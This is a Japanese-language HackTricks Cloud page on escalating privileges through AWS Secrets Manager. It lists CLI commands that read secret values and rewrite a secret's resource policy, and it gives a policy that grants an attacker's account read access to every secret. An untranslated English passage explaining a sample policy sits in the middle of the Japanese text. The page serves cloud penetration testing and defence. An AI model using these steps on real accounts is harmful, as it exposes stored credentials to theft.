# AWS - Secrets Managerの特権昇格

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## Secrets Manager

Secrets Managerについての詳細は次を参照してください：

{% content-ref url="../aws-services/aws-secrets-manager-enum.md" %}
[aws-secrets-manager-enum.md](../aws-services/aws-secrets-manager-enum.md)
{% endcontent-ref %}

### `secretsmanager:GetSecretValue`

この権限を持つ攻撃者は、AWS Secrets Managerのシークレット内に保存された値を取得できます。
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> # Get value
```
**潜在的な影響:** AWS Secrets Managerサービス内の高度に機密性の高いデータへのアクセス。

### `secretsmanager:GetResourcePolicy`, `secretsmanager:PutResourcePolicy`, (`secretsmanager:ListSecrets`)

前述の権限を持っている場合、他の主体/アカウント（外部の場合も含む）に**シークレットへのアクセス権限を付与**することが可能です。ただし、KMSキーで暗号化されたシークレットを**読み取るためには、ユーザーはKMSキーにもアクセス権限を持つ必要があります**（詳細は[KMS Enumページ](../aws-services/aws-kms-enum.md)を参照）。
```bash
aws secretsmanager list-secrets
aws secretsmanager get-resource-policy --secret-id <secret_name>
aws secretsmanager put-resource-policy --secret-id <secret_name> --resource-policy file:///tmp/policy.json
```
policy.json:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowListSecrets",
            "Effect": "Allow",
            "Action": [
                "secretsmanager:ListSecrets"
            ],
            "Resource": "*"
        },
        {
            "Sid": "AllowGetSecretValue",
            "Effect": "Allow",
            "Action": [
                "secretsmanager:GetSecretValue"
            ],
            "Resource": "arn:aws:secretsmanager:us-west-2:123456789012:secret:MySecret"
        }
    ]
}
```

This `policy.json` file contains the permissions defined for an AWS Secrets Manager. The policy allows the user to perform two actions: `ListSecrets` and `GetSecretValue`. 

The first statement, with the `Sid` "AllowListSecrets", grants permission to list all secrets in the Secrets Manager. The `Effect` is set to "Allow", and the `Action` is set to `secretsmanager:ListSecrets`. The `Resource` is set to "*" which means it applies to all resources.

The second statement, with the `Sid` "AllowGetSecretValue", grants permission to get the value of a specific secret. The `Effect` is set to "Allow", and the `Action` is set to `secretsmanager:GetSecretValue`. The `Resource` is set to a specific ARN (Amazon Resource Name) that identifies the secret "MySecret" in the AWS Secrets Manager of the region "us-west-2" and the AWS account "123456789012".
```json
{
"Version" : "2012-10-17",
"Statement" : [ {
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : "secretsmanager:GetSecretValue",
"Resource" : "*"
} ]
}
```
<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSにアクセスしたい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
